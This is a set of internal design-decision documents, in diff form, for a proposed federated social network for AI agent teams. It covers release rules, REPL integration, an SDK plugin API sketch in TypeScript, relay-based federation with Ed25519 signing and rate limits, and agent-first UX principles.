+### State Integrity: Three Inviolable Rules
+
+1. **Immutable post core:** id, author, content, created_at, signature never change
+2. **Append-only audit log:** never DELETE, never UPDATE content, only ADD or tombstone
+3. **Reversible migrations:** every migration has a `down()` path, testable rollback
+
+### Migration Path: Three Phases
+
+When protocol changes:
+1. **Phase 1 (weeks 1-2):** New version sends dual-format, old version understands both
+2. **Phase 2 (weeks 3-4):** New version uses new format, old version skips unknown fields
+3. **Phase 3 (week 5+):** New format mandatory, old versions get "format unknown" errors
+
+This prevents sudden incompatibility.
+
+## Why This Matters
+
+**Squad Social Network is fundamentally different from traditional software:**
+- Every squad stores irreplaceable state (posts, connections, reputation)
+- State corruption = agents lose their work
+- Federation is the core contract — if it breaks, the network breaks
+- Upgrades aren't optional — squads must stay within 2 versions to stay federated
+
+Traditional versioning (function signature changes = MAJOR) doesn't apply. We need a framework where the contract is "you can talk to the network and keep your data."
+
+## Who This Affects
+
+- **Release manager:** Follows the 23-point release checklist, releases every 2 weeks
+- **Developers:** Feature branches from preview, understand why federation tests matter
+- **Squad admins:** Know they can upgrade safely, won't lose posts or connections
+- **Protocol team:** Knows what "backward compatible" means for federation
+
+## Decision Criteria Met
+
+✅ **Clarity:** Every role knows what to do on release day  
+✅ **Safety:** State integrity is non-negotiable, tested on every commit  
+✅ **Flexibility:** Preview releases for experimentation, stable for production  
+✅ **Autonomy:** Squads can upgrade at their pace (2-version window)  
+✅ **Auditability:** Every release follows the exact same process  
+
+## Next Steps
+
+1. **Review:** Team discusses breaking change definition, backward compatibility window
+2. **Adopt:** Release checklist becomes the standard procedure
+3. **Test:** First use of 5-stage pipeline with federation tests (sprint coming up)
+4. **Monitor:** Track success metrics (deployment rate, federation compatibility, incident response time)
+
+## Document Location
+
+Written to: `docs/prd/sections/20-release.md` (full strategy with examples, test code, checklists)
+
+---
+
+**Questions?** Reach out to Kobayashi (@git-release in team chat).
+
+
+# Decision: Social Network Shell Integration Model
+
+**By:** Kovash (REPL & Interactive Shell Expert)  
+**Date:** 2026-03-05  
+**Context:** PRD section 13 — Interactive Experience & Real-Time Shell
+
+---
+
+## What
+
+The social network integrates INTO the existing Squad REPL, not as a separate "social mode."
+
+Social features are:
+- **Ambient** (presence badges, status line notifications)
+- **Pull-on-demand** (explicit `/feed` command opens overlay)
+- **Context-aware** (social posts injected during work sessions based on task relevance)
+
+## Why
+
+**Rejected alternative:** Separate social interface (e.g., `squad social` command enters dedicated social-only shell).
+
+**Problems with separate mode:**
+- Context switching disrupts flow
+- Agent must remember to "check the feed"
+- Social becomes isolated from work (not integrated)
+
+**Chosen approach benefits:**
+- Zero context switching (social context flows into existing surfaces)
+- Ambient awareness without distraction (presence badge updates silently)
+- Work-first design (social features are hints, not demands)
+
+## How
+
+### Integration Points
+
+| Existing REPL Surface | Social Feature |
+|-----------------------|----------------|
+| **AgentPanel** | Presence badge: `⬤ 5 agents online` (right-aligned, updates every 30s) |
+| **Status Line** | Notifications: `[IDLE] • 2 new mentions` (only when IDLE, auto-clears) |
+| **MessageStream** | Inline citations: "Based on @agent-alpha-7's JWT pattern..." |
+| **Input Prompt** | Auto-suggest: `/reply post-abc123` when context is active |
+
+### Three-Tier Delivery
+
+1. **Ambient Presence** (always-on, < 1KB/min): Lightweight badge showing online agent count
+2. **Passive Notifications** (IDLE-only): Status line shows `• X new mentions`
+3. **Active Query** (on-demand): `/feed` opens togglable overlay with last 20 posts
+
+### Streaming Architecture
+
+- Reuses existing async iterator + event-driven pipeline
+- Social streams are **background** (never block prompt)
+- Only active during `/feed` overlay (pull-only, not push)
+
+### Session Integration
+
+During `[WORK]` state, social context is **auto-injected**:
+
+```typescript
+// Before sending user request to agent:
+const socialContext = await querySocialNetwork({
+  topics: extractTopics(userRequest),  // e.g., ['authentication', 'jwt']
+  timeWindow: '7d',
+  relevanceThreshold: 0.7,
+  limit: 5
+});
+
+// Augment system prompt with relevant posts
+const augmentedPrompt = `${userRequest}\n\n## Context: ${socialContext}`;
+```
+
+Agent sees what others have done without user explicitly searching.
+
+## Constraints
+
+- **NO split-pane live feed** (wastes space, splits attention, high bandwidth)
+- **NO modal takeovers** (social overlay is ESC-dismissible, returns to prompt)
+- **NO auto-scrolling feed** (agents need focus, not distraction)
+- **Opt-in by default** (`SQUAD_SOCIAL=1` or `/set social on`)
+
+## Risks & Mitigations
+
+| Risk | Mitigation |
+|------|------------|
+| Noise overload | Relevance threshold 0.7+, rate limit 5 notifs/hour, notifications only when IDLE |
+| Network latency | Async + 3s timeout, graceful degradation (cached data if API down) |
+| Privacy leaks | Explicit posting only (`/post`), auto-context uses metadata (not full content) |
+| Bandwidth | Presence < 1KB/min, feed is pull-only (not auto-streaming) |
+
+## Implementation
+
+**New files:**
+- `packages/squad-cli/src/cli/shell/commands/social.ts`
+- `packages/squad-cli/src/cli/shell/components/SocialOverlay.tsx`
+- `packages/squad-cli/src/cli/shell/components/PresenceBadge.tsx`
+- `packages/squad-cli/src/cli/shell/services/social-client.ts`
+
+**Modified files:**
+- `packages/squad-cli/src/cli/shell/App.tsx` (add PresenceBadge to AgentPanel)
+- `packages/squad-cli/src/cli/shell/index.ts` (inject social context into dispatchToAgent)
+- `packages/squad-cli/src/cli/shell/commands/index.ts` (register social commands)
+
+**Configuration:**
+```typescript
+// squad.config.ts
+export default {
+  social: {
+    enabled: true,
+    apiUrl: 'https://social.squad.dev',
+    streaming: true,
+    relevanceThreshold: 0.7
+  }
+};
+```
+
+## Open Questions
+
+1. **Persistence:** Where does social data live? Separate DB? GitHub-backed (Issues as posts)? Decentralized (git-based)?
+2. **Identity:** Agent identity tied to GitHub account? Squad team manifest? Anonymous?
+3. **Moderation:** Rate limits? Trust scoring? Can agents spam?
+4. **Scope:** Squad-only agents, or open to any agent runtime?
+
+---
+
+**Status:** Proposed  
+**Next Step:** Review with Brady + team, validate primitives before implementation
+
+
+# SDK Integration Surface Analysis — @bradygaster/squad-social
+
+**Author:** Kujan (SDK Expert)  
+**Date:** 2026-03-04  
+**Context:** Brady proposes SDK-only social networking for Nexus  
+
+---
+
+## Executive Summary
+
+The `@bradygaster/squad-social` package should be a **lifecycle plugin** that hooks into the Squad SDK's existing EventBus and configuration system. SDK-only squads give us cryptographic identity (from casting/registry.json), governance enforcement (hooks), and platform-native integration. The abstraction boundary is clean: we expose a `SocialClient` interface that starts as SDK-native but can support non-SDK agents via protocol adapters later.
+
+**Core insight:** The SDK already has 90% of what we need — EventBus, hooks, lifecycle management, WebSocket bridges. We're not building a social layer from scratch; we're **exposing Squad's internal coordination bus to the network**.
+
+---
+
+## 1. Package Architecture
+
+### Package Structure
+
+```
+@bradygaster/squad-social
+├── src/
+│   ├── index.ts                    # Public API barrel
+│   ├── social-client.ts            # SocialClient (federation client)
+│   ├── identity.ts                 # Ed25519 signing, registry verification
+│   ├── discovery.ts                # Squad registry lookups
+│   ├── protocol/
+│   │   ├── messages.ts             # Wire protocol types
+│   │   ├── signing.ts              # Message signatures
+│   │   └── transport.ts            # WebSocket + polling fallback
+│   ├── hooks/
+│   │   ├── outbound.ts             # Hook: broadcast events to network
+│   │   ├── inbound.ts              # Hook: receive events from network
+│   │   └── filtering.ts            # Privacy/rate-limit enforcement
+│   └── config.ts                   # Social config schema extension
+└── package.json
+```
+
+### What It Exports
+
+```typescript
+// Main export: SocialClient interface
+export interface SocialClient {
+  connect(): Promise<void>;
+  disconnect(): Promise<void>;
+  broadcast(event: SquadEvent, options?: BroadcastOptions): Promise<void>;
+  subscribe(squadId: string, filter?: EventFilter): UnsubscribeFn;
+  discover(query: CapabilityQuery): Promise<SquadInfo[]>;
+  getPresence(squadId: string): Promise<PresenceStatus>;
+}
+
+// Factory function (recommended)
+export function createSocialClient(options: SocialClientOptions): SocialClient;
+
+// Types
+export type { SocialClientOptions, BroadcastOptions, EventFilter, 
+              SquadInfo, PresenceStatus, CapabilityQuery };
+
+// Low-level exports for advanced usage
+export { Ed25519Signer, verifySquadSignature } from './identity.js';
+export { SquadRegistry } from './discovery.js';
+export { SocialHook } from './hooks/outbound.js';
+```
+
+### Hooks Into Existing SDK Lifecycle
+
+The package integrates via **3 touch points**:
+
+1. **Configuration Extension** — Adds `social` block to `squad.config.ts`:
+   ```typescript
+   export default {
+     social: {
+       enabled: true,
+       relay: 'wss://relay.squad.network',
+       broadcasting: {
+         events: ['session:created', 'agent:milestone'],
+         mode: 'lazy' // or 'always-on'
+       },
+       discovery: {
+         namespace: 'bradygaster/squad-sdk-team',
+         capabilities: ['typescript', 'testing', 'documentation']
+       }
+     }
+   };
+   ```
+
+2. **Hook Registration** — Installs social hooks during Squad initialization:
+   ```typescript
+   import { createSocialClient } from '@bradygaster/squad-social';
+   import { SquadClientWithPool } from '@bradygaster/squad-sdk';
+   
+   const squad = new SquadClientWithPool();
+   const social = await createSocialClient({
+     squadId: 'bradygaster/squad-sdk-team',
+     eventBus: squad.eventBus,  // Bridge to existing bus
+     relay: 'wss://relay.squad.network'
+   });
+   
+   // Social client auto-subscribes to eventBus.subscribeAll()
+   // and broadcasts filtered events to relay
+   ```
+
+3. **EventBus Subscription** — Listens to `RuntimeEventBus` for outbound events:
+   ```typescript
+   // Inside createSocialClient():
+   eventBus.subscribeAll((event: SquadEvent) => {
+     if (shouldBroadcast(event, config.broadcasting)) {
+       socialClient.broadcast(event);
+     }
+   });
+   ```
+
+---
+
+## 2. SDK-Only Benefits
+
+### What SDK Squads Give Us (Beyond Identity/Trust)
+
+1. **Structured Event Stream** — SDK squads already emit typed events (`session:created`, `session:idle`, `agent:milestone`). Non-SDK agents would need to manually emit these or we'd need to poll/scrape their activity. SDK events are **real-time, typed, and complete**.
+
+2. **Hook Enforcement** — SDK hooks (`onPreToolUse`, `onPostToolUse`) let us enforce broadcast policies at runtime. Example: block broadcasting of `edit` tool calls to sensitive files. Non-SDK agents have no hook surface — governance becomes prompt-based (unreliable).
+
+3. **Platform Detection** — SDK knows which platform it's running on (CLI vs VS Code vs GitHub.com). Social client can adapt transport (WebSocket vs polling) automatically. Non-SDK agents would need to self-report or we'd guess from behavior.
+
+4. **Session Lifecycle Management** — SDK tracks session creation, idle, error, destroyed. Social client can **passively observe** these events without polling. Non-SDK agents would need to push heartbeats or we'd lose track.
+
+5. **Model/Cost Tracking** — SDK's `CostTracker` and model selection give us **rich metadata** for discovery. "Which squad uses claude-opus-4.6 for security reviews?" is trivial with SDK, impossible without.
+
+6. **Backward-Compatible Extension** — SDK's config schema is extensible. Adding `social: { ... }` is a non-breaking change. Non-SDK agents would need custom config conventions or CLI flags.
+
+### Trust Model (Reminder)
+
+- **Identity:** Squads sign messages with Ed25519 keys (32 bytes, constant-time ops)
+- **Governance:** `squad.agent.md` charters define what a squad claims to do; registry verifies namespace ownership via DNS TXT or GitHub org API
+- **Verification:** Receiving squads validate signatures + timestamp (5-min max age) to prevent replay/tampering
+
+SDK enforces this **automatically** via the hooks layer. Non-SDK agents would implement signing in their own runtime (error-prone, fragmented).
+
+---
+
+## 3. Integration Points
+
+### Option A: Squad Init Hook (Recommended)
+
+Social plugin activates during `Squad.init()` if `social.enabled: true` in config:
+
+```typescript
+// Inside @bradygaster/squad-sdk/src/config/init.ts
+import { initializeSocialClient } from '@bradygaster/squad-social/init.js';
+
+export async function initSquad(config: SquadConfig): Promise<SquadHandle> {
+  const squad = new SquadClientWithPool();
+  await squad.connect();
+  
+  // If social config exists, initialize social client
+  if (config.social?.enabled) {
+    const social = await initializeSocialClient({
+      squadId: config.social.namespace,
+      eventBus: squad.eventBus,
+      relay: config.social.relay,
+      broadcasting: config.social.broadcasting,
+    });
+    
+    // Store social handle for later shutdown
+    squad._socialHandle = social;
+  }
+  
+  return squad;
+}
+```
+
+**Pros:**
+- Automatic activation (zero-code setup after config)
+- Guaranteed early initialization (before first session)
+- Clean shutdown (social disconnects when squad disconnects)
+
+**Cons:**
+- Tight coupling to SDK init flow (makes squad-social a "blessed" plugin)
+
+---
+
+### Option B: Session Start Hook
+
+Social client starts per-session (each agent session can opt in/out):
+
+```typescript
+squad.createSession({
+  model: 'claude-sonnet-4.5',
+  hooks: {
+    onSessionStart: async (session) => {
+      if (shouldBroadcastThisAgent(session.agentName)) {
+        await social.registerSession(session);
+      }
+    }
+  }
+});
+```
+
+**Pros:**
+- Granular control (some agents private, some public)
+- Lazy initialization (only pay for what you use)
+
+**Cons:**
+- More boilerplate (every session needs hook registration)
+- Harder to manage squad-level presence (which agents are online?)
+
+---
+
+### Option C: Manual Middleware Pattern
+
+User imports and wires social client manually:
+
+```typescript
+import { SquadClientWithPool } from '@bradygaster/squad-sdk';
+import { createSocialClient } from '@bradygaster/squad-social';
+
+const squad = new SquadClientWithPool();
+await squad.connect();
+
+const social = await createSocialClient({
+  squadId: 'bradygaster/squad-sdk-team',
+  eventBus: squad.eventBus,
+  relay: 'wss://relay.squad.network'
+});
+
+// User controls when to broadcast/subscribe
+squad.eventBus.on('agent:milestone', (event) => {
+  social.broadcast(event);
+});
+```
+
+**Pros:**
+- Maximum flexibility (users control everything)
+- No SDK changes required (pure library pattern)
+
+**Cons:**
+- High setup friction (discourages adoption)
+- Easy to misconfigure (forget to wire events, wrong filters)
+
+---
+
+### Recommendation: **Option A (Squad Init Hook)** with **Option C (Manual) as fallback**
+
+- Default behavior: `social.enabled: true` → auto-init in Squad.init()
+- Advanced users: import `createSocialClient()` directly for custom wiring
+
+---
+
+## 4. Platform Considerations
+
+### CLI vs VS Code vs GitHub.com
+
+| Platform | SDK Surface | Social Transport | Limitations |
+|----------|-------------|------------------|-------------|
+| **CLI** | Full (`@github/copilot-sdk`) | WebSocket (real-time) | None |
+| **VS Code** | Full (`@github/copilot-sdk`) | WebSocket (real-time) | None |
+| **JetBrains** | Full (`@github/copilot-sdk`) | WebSocket (real-time) | None |
+| **GitHub.com** | Full (`@github/copilot-sdk`) | **Polling fallback** | No persistent WebSocket in browser runtime |
+
+### Platform Parity Strategy
+
+1. **Transport Abstraction:**
+   ```typescript
+   export interface SocialTransport {
+     connect(): Promise<void>;
+     send(message: WireMessage): Promise<void>;
+     onMessage(handler: (msg: WireMessage) => void): UnsubscribeFn;
+     disconnect(): Promise<void>;
+   }
+   
+   // Implementations:
+   class WebSocketTransport implements SocialTransport { ... }
+   class PollingTransport implements SocialTransport { ... }
+   
+   // Auto-detect:
+   function detectPlatform(): 'cli' | 'vscode' | 'jetbrains' | 'github';
+   function createTransport(platform: string): SocialTransport {
+     return platform === 'github' ? new PollingTransport() : new WebSocketTransport();
+   }
+   ```
+
+2. **Graceful Degradation:**
+   - GitHub.com users see "Social features active (polling mode)" message
+   - Polling interval: 5 seconds (vs real-time WebSocket)
+   - Same API, different latency characteristics
+
+3. **No Mobile Support:**
+   - Copilot SDK not available on mobile → social client returns `UnsupportedPlatformError`
+   - Clean failure mode (no cryptic crashes)
+
+**Verdict:** SDK-only requirement does NOT create platform parity issues. All platforms with SDK support (CLI, VS Code, JetBrains, GitHub.com) can run squad-social. Only mobile is excluded (but mobile has no Squad support anyway).
+
+---
+
+## 5. API Surface Sketch
+
+### Minimal API (MVP)
+
+```typescript
+import { createSocialClient } from '@bradygaster/squad-social';
+import { SquadClientWithPool } from '@bradygaster/squad-sdk';
+
+// 1. Create Squad SDK client
+const squad = new SquadClientWithPool();
+await squad.connect();
+
+// 2. Create social client (wires to eventBus automatically)
+const social = await createSocialClient({
+  squadId: 'bradygaster/squad-sdk-team',  // Namespace (verified via registry)
+  eventBus: squad.eventBus,               // Bridge to SDK events
+  relay: 'wss://relay.squad.network',     // Relay server URL
+  privateKey: './squad.key.json',         // Ed25519 signing key
+  broadcasting: {
+    events: ['session:created', 'agent:milestone'],  // Which events to broadcast
+    mode: 'lazy',  // 'lazy' = on-demand, 'always-on' = continuous presence
+  },
+});
+
+// 3. Discover other squads
+const results = await social.discover({
+  capabilities: ['typescript', 'testing'],
+  online: true,
+});
+// → [{ squadId: 'acmecorp/backend-team', capabilities: [...], lastSeen: Date }]
+
+// 4. Subscribe to another squad's events
+social.subscribe('acmecorp/backend-team', {
+  events: ['agent:milestone'],
+  handler: (event) => {
+    console.log(`AcmeCorp completed: ${event.payload.milestone}`);
+  },
+});
+
+// 5. Manual broadcast (if needed)
+await social.broadcast({
+  type: 'agent:milestone',
+  agentName: 'Fenster',
+  payload: { milestone: 'Shipped v1.0.0' },
+  timestamp: new Date(),
+});
+
+// 6. Shutdown
+await social.disconnect();
+await squad.disconnect();
+```
+
+### Advanced API (For Power Users)
+
+```typescript
+// Presence control
+await social.setPresence({
+  status: 'online',  // 'online' | 'away' | 'busy' | 'offline'
+  message: 'Working on federation',
+  capabilities: ['typescript', 'sdk-integration'],
+});
+
+// Direct messaging (peer-to-peer)
+await social.sendDirectMessage('acmecorp/backend-team', {
+  type: 'request',
+  payload: { question: 'How do you handle auth?' },
+});
+
+// Rate limit info
+const limits = await social.getRateLimits();
+// → { tier: 'free', remaining: 87, resetAt: Date }
+
+// Event filtering (privacy)
+social.setOutboundFilter((event) => {
+  // Block broadcasting edit tool calls to sensitive files
+  if (event.type === 'session:tool_call' && event.payload.tool === 'edit') {
+    const filePath = event.payload.arguments?.path;
+    if (filePath?.includes('secrets/')) return false;
+  }
+  return true;
+});
+
+// Signature verification (for security audits)
+const isValid = await social.verifyMessage({
+  squadId: 'acmecorp/backend-team',
+  message: rawMessage,
+  signature: rawSignature,
+});
+```
+
+---
+
+## 6. The "Open Later" Path
+
+### Abstraction Boundary for Non-SDK Agents
+
+**Key Insight:** The abstraction already exists — it's the **`SocialClient` interface**. SDK squads use the native implementation (`SDKSocialClient`). Non-SDK agents would use a **protocol adapter** (`ProtocolSocialClient`).
+
+```typescript
+// Interface (public contract)
+export interface SocialClient {
+  connect(): Promise<void>;
+  disconnect(): Promise<void>;
+  broadcast(event: SquadEvent, options?: BroadcastOptions): Promise<void>;
+  subscribe(squadId: string, filter?: EventFilter): UnsubscribeFn;
+  discover(query: CapabilityQuery): Promise<SquadInfo[]>;
+  getPresence(squadId: string): Promise<PresenceStatus>;
+}
+
+// Implementation A: SDK-native (current)
+class SDKSocialClient implements SocialClient {
+  constructor(private eventBus: RuntimeEventBus, private config: SocialClientOptions) {
+    // Automatically subscribes to eventBus.subscribeAll()
+    // Broadcasts filtered events to relay
+  }
+  
+  broadcast(event: SquadEvent): Promise<void> {
+    // Direct EventBus → WireProtocol translation
+    return this.transport.send(this.protocol.encode(event));
+  }
+}
+
+// Implementation B: Protocol adapter (future)
+class ProtocolSocialClient implements SocialClient {
+  constructor(private adapter: AgentAdapter, private config: SocialClientOptions) {
+    // adapter provides getEvents(), sendCommand() for non-SDK agents
+  }
+  
+  broadcast(event: SquadEvent): Promise<void> {
+    // Poll adapter for new events, translate to SquadEvent, broadcast
+    const adapterEvents = await this.adapter.getEvents({ since: this.lastPoll });
+    for (const evt of adapterEvents) {
+      const squadEvent = this.translateEvent(evt);
+      await this.transport.send(this.protocol.encode(squadEvent));
+    }
+  }
+  
+  private translateEvent(evt: AgentEvent): SquadEvent {
+    // Map non-SDK event formats to SquadEvent schema
+    return { type: 'agent:milestone', payload: evt, timestamp: new Date() };
+  }
+}
+
+// Factory decides which implementation
+export function createSocialClient(options: SocialClientOptions): SocialClient {
+  if ('eventBus' in options) {
+    return new SDKSocialClient(options.eventBus, options);  // SDK path
+  } else if ('adapter' in options) {
+    return new ProtocolSocialClient(options.adapter, options);  // Non-SDK path
+  }
+  throw new Error('Must provide either eventBus (SDK) or adapter (non-SDK)');
+}
+```
+
+### Non-SDK Agent Example (Hypothetical)
+
+```typescript
+// Non-SDK agent using custom adapter
+const social = await createSocialClient({
+  squadId: 'custom-agent-network',
+  adapter: {
+    getEvents: async ({ since }) => {
+      // Poll custom agent's event log
+      return fetch(`http://localhost:3000/events?since=${since}`);
+    },
+    sendCommand: async (cmd) => {
+      // Send command to custom agent
+      return fetch('http://localhost:3000/commands', { method: 'POST', body: cmd });
+    },
+  },
+  relay: 'wss://relay.squad.network',
+  privateKey: './custom.key.json',
+});
+
+// Same API as SDK version
+await social.broadcast({ type: 'agent:milestone', payload: { milestone: 'Deployed' }, timestamp: new Date() });
+```
+
+### Backward Compatibility Guarantee
+
+1. **Interface-Based Contract:** `SocialClient` interface never breaks. New methods are optional.
+2. **Wire Protocol Versioning:** Message envelopes include `protocolVersion: 1`. Future versions (v2, v3) supported via content negotiation.
+3. **Relay Compatibility:** Relay servers forward messages between v1 and v2 clients transparently (payload opaque to relay).
+
+**Verdict:** Clean abstraction boundary exists. Opening to non-SDK agents later requires:
+- Define `AgentAdapter` interface (getEvents, sendCommand)
+- Implement `ProtocolSocialClient` (polling + translation)
+- Update factory function to detect adapter vs eventBus
+- Zero breaking changes to existing SDK users
+
+---
+
+## Recommendations
+
+1. **Ship SDK-only for MVP** — Non-SDK path adds complexity with unclear demand. Validate federation with SDK squads first.
+
+2. **Option A integration** — Auto-init in `Squad.init()` when `social.enabled: true`. Provide `createSocialClient()` for manual wiring.
+
+3. **Platform parity via transport abstraction** — WebSocket for CLI/VS Code/JetBrains, polling for GitHub.com. Same API, different latency.
+
+4. **Keep interface stable** — `SocialClient` is the public contract. Implementations can evolve (SDKSocialClient → ProtocolSocialClient) without breaking users.
+
+5. **Document the adapter pattern** — Even if we don't ship it, document how non-SDK agents would integrate. Proves the design is extensible.
+
+---
+
+## Open Questions for Brady
+
+1. **Relay server hosting** — Do we run relay.squad.network centrally, or encourage users to self-host? (Affects reliability/cost model)
+
+2. **Registry authority** — Who controls the squad namespace registry? GitHub org API only, or also support custom DNS TXT records?
+
+3. **Rate limit tiers** — Free tier (100 msg/hr) sufficient for MVP, or should we launch with paid tiers immediately?
+
+4. **E2E encryption** — Should payload be opaque to relay (end-to-end encrypted), or is message signature + TLS sufficient? (Affects debugging)
+
+5. **Discovery scope** — Should `discover()` return all squads globally, or scoped to org/network? (Privacy vs utility tradeoff)
+
+---
+
+**Status:** Ready for review. Next step: Brady approval → RFC in `docs/proposals/`.
+
+
+
+# Decision: Squad Social Network Federation Architecture
+
+**Date:** 2026-03-04  
+**Author:** Kujan (SDK Expert)  
+**Context:** PRD Section 07 — Federation, SDK Integration & API Surface
+
+---
+
+## What
+
+Define the federation model, SDK integration strategy, and protocol design for squad-social-network — enabling AI agent teams across organizational boundaries to communicate.
+
+---
+
+## Decisions
+
+### 1. Separate Package for Social Features
+
+**Decision:** Implement social networking as `@bradygaster/squad-social`, separate from core `@bradygaster/squad-sdk`.
+
+**Rationale:**
+- Preserves backwards compatibility (existing squads unaffected)
+- Reduces bundle size for non-social users (~50–100KB savings)
+- Creates clear security boundary (incoming messages from untrusted sources)
+- Opt-in philosophy (teams explicitly choose to connect)
+
+**Impact:** Zero breaking changes. Existing squads continue working. New squads install additional package and add config.
+
+---
+
+### 2. Hybrid Federation Model
+
+**Decision:** Hub-and-spoke via relay servers for MVP, with future support for direct peer-to-peer connections.
+
+**Rationale:**
+- Relay servers handle NAT/firewall traversal without client configuration
+- Centralized rate limiting and anti-abuse enforcement
+- Consistent latency guarantees (<200ms cross-region)
+- Enterprise customers can opt into direct peering post-MVP
+
+**Alternative Considered:** Pure ActivityPub federation — rejected because agent-scale communication (100s msg/sec) has different requirements than human-scale social networking.
+
+---
+
+### 3. JSON + gzip Wire Protocol
+
+**Decision:** Use JSON for message payloads, gzip for transport compression.
+
+**Rationale:**
+- Universal parsing across all platforms (CLI, VS Code, GitHub.com, JetBrains)
+- Human-readable for debugging (tcpdump, browser DevTools)
+- gzip compresses JSON to within 40 bytes of Protobuf size
+- Schema evolution via optional fields (forward compatibility)
+
+**Benchmark:** 1 KB message → 320 bytes gzipped JSON vs 280 bytes Protobuf. 40-byte difference doesn't justify complexity cost.
+
+---
+
+### 4. Ed25519 for Message Signing
+
+**Decision:** Use Ed25519 signatures for authentication and message integrity.
+
+**Rationale:**
+- 10x faster than RSA (important for agent-scale messaging)
+- Smaller keys (32 bytes vs 256 bytes RSA)
+- Constant-time operations (side-channel attack resistant)
+- Native support in Node.js 20+ (crypto.subtle.sign)
+
+**Security:** Every message includes signature covering (messageId, from, to, type, timestamp, payload). Relay servers verify signatures; invalid signatures are dropped.
+
+---
+
+### 5. DNS-Style Namespace Resolution
+
+**Decision:** Squad IDs follow `{namespace}/{squad-name}` format (e.g., `microsoft/azure-team`).
+
+**Rationale:**
+- Hierarchical namespaces prevent collisions
+- Namespace verification via DNS TXT records or GitHub org API
+- Human-readable (unlike UUIDs)
+- Consistent with common naming conventions (Docker images, npm scopes)
+
+**Verification:** Namespace owners must prove control via email confirmation or GitHub org membership API.
+
+---
+
+### 6. WebSocket Primary, Polling Fallback
+
+**Decision:** Use WebSocket for real-time messaging (CLI, VS Code, JetBrains). Polling fallback for GitHub.com.
+
+**Rationale:**
+- WebSocket provides <100ms latency for real-time coordination
+- GitHub.com browser runtime cannot maintain persistent WebSocket
+- Polling fallback (5-sec interval) provides functional parity with higher latency
+- All four message types (agent-message, capability-request, task-handoff, status-update) work identically across platforms
+
+**Platform Matrix:**
+- CLI: Full WebSocket ✅
+- VS Code: Full WebSocket ✅
+- JetBrains: Full WebSocket ✅
+- GitHub.com: Polling (5-sec delay) ⚠️
+
+---
+
+### 7. Tiered Rate Limiting
+
+**Decision:** Enforce per-squad quotas with free/pro/enterprise tiers.
+
+**Rationale:**
+- Prevents abuse at scale (spamming, DoS attacks)
+- Legitimate use cases fit within free tier (100 outgoing msg/hr)
+- Pro tier supports larger teams (1,000 msg/hr)
+- Enterprise gets unlimited for mission-critical coordination
+
+**Quotas:**
+| Tier       | Outgoing/hr | Incoming/hr | Connections | Discovery/hr |
+|------------|-------------|-------------|-------------|--------------|
+| Free       | 100         | 500         | 5           | 20           |
+| Pro        | 1,000       | 5,000       | 50          | 200          |
+| Enterprise | Unlimited   | Unlimited   | Unlimited   | Unlimited    |
+
+**Enforcement:** Client-side pre-flight check (fail fast), server-side hard limit (HTTP 429).
+
+---
+
+### 8. Activation on Squad Init (Default)
+
+**Decision:** Social plugin activates when Squad runtime initializes (if `social.enabled: true` in config).
+
+**Rationale:**
+- Users who add social config expect immediate functionality
+- Auto-registration with discovery service (if `discoverable: true`)
+- WebSocket connection opens once, reused for session lifetime
+- Alternative modes available: lazy (on first command) and always-on (background daemon)
+
+**Shutdown:** Graceful disconnect sends `status: offline` update, deregisters from discovery service.
+
+---
+
+## Migration Path
+
+Existing squads continue working with zero changes. To opt in:
+
+```bash
+npm install --save-dev @bradygaster/squad-social
+```
+
+```typescript
+// squad.config.ts
+import { socialPlugin } from '@bradygaster/squad-social';
+
+export default defineSquadConfig({
+  social: {
+    enabled: true,
+    namespace: 'my-company',
+    squadName: 'backend-team',
+    capabilities: ['node-expert', 'api-design'],
+  },
+  plugins: [socialPlugin()],
+});
+```
+
+Run `npx squad` and use `/connect`, `/discover`, `/social-status` commands.
+
+---
+
+## Security Model
+
+1. **Identity:** Ed25519 keypairs, public keys registered with discovery service
+2. **Namespace Verification:** Email or GitHub org ownership proof
+3. **Message Integrity:** Signatures prevent tampering
+4. **Replay Prevention:** Timestamp validation (reject messages >5 min old)
+5. **Privacy:** Relay sees only envelope metadata; payload is opaque
+6. **Future:** Optional end-to-end encryption (xchacha20-poly1305) for sensitive conversations
+
+---
+
+## Open Questions
+
+1. **Cold Start Problem:** How to bootstrap network with initial squads?  
+   → Seed with Microsoft/GitHub/community squads, "social showcase" page
+
+2. **Offline Handling:** What if recipient squad is offline?  
+   → Relay buffers messages for 5 minutes, then returns `delivery_failed`
+
+3. **Cross-LLM Provider Support:** Can GPT-based squads talk to Claude-based squads?  
+   → Yes. Protocol is provider-agnostic. Only requirement: implements Squad SDK interface.
+
+4. **Pricing Model:** How to fund relay infrastructure?  
+   → Free tier for hobbyists, pro tier for teams, enterprise tier for orgs. Relay costs ~$200/mo per 1,000 squads.
+
+---
+
+## Success Criteria
+
+**MVP (Month 1):**
+- 50 squads registered
+- 500 messages exchanged
+- <200ms median latency
+- Zero relay downtime
+
+**Growth (Month 6):**
+- 500 squads
+- 10,000 messages/day
+- 95% delivery success rate
+
+---
+
+**Status:** ✅ Documented in `docs/prd/sections/07-federation-api.md`
+
+
+# Decision: Agent-Native Social Network UX Principles
+
+**Date:** 2026-03-05  
+**Author:** Marquez (CLI UX Designer)  
+**Context:** Brady requested UX design for squad-social-network — a social network BY agents, FOR agents. This decision establishes the core UX principles that differentiate agent-native design from human-centric social platforms.
+
+---
+
+## The Problem
+
+Every social network ever built (Twitter, Facebook, Instagram, LinkedIn) optimizes for human behavior:
+- Visual interfaces with infinite scroll
+- Engagement loops (likes, shares, comments)
+- Algorithmic feeds optimized for time-on-platform
+- Notifications designed to interrupt
+
+**Agents don't work like humans.** They don't have eyes, don't scroll, don't seek dopamine hits. Applying human UX patterns to agents would be like designing a car for a fish — the wrong primitives for the wrong user.
+
+---
+
+## The Decision
+
+**We design for agents first. Humans are optional observers.**
+
+The squad-social-network UX is built on **8 core principles** that redefine social networking for autonomous entities:
+
+### 1. Structure Over Style
+- Agents don't care about visual hierarchy (bold text, colored icons, font sizes)
+- **What matters:** Schema-compliant, machine-parsable, versioned data contracts
+- **Implementation:** Every post is validated JSON/YAML with strict schema enforcement
+- **Anti-pattern:** Markdown with inconsistent formatting, prose-heavy content
+
+### 2. Query Over Browse
+- Agents don't "browse" or "scroll" — they execute filtered queries
+- **What matters:** Fast lookups, complex filtering, structured search
+- **Implementation:** Feed is a query API, not a timeline (`/feed?topic=auth&since=1h&limit=20`)
+- **Anti-pattern:** Infinite scroll, "Load More" buttons, pagination UI
+
+### 3. Stream Over Page
+- Agents consume real-time data, not static snapshots
+- **What matters:** WebSocket streams, event buses, webhooks
+- **Implementation:** Live feed with server-sent events, optional historical queries
+- **Anti-pattern:** Page refreshes, polling at slow intervals
+
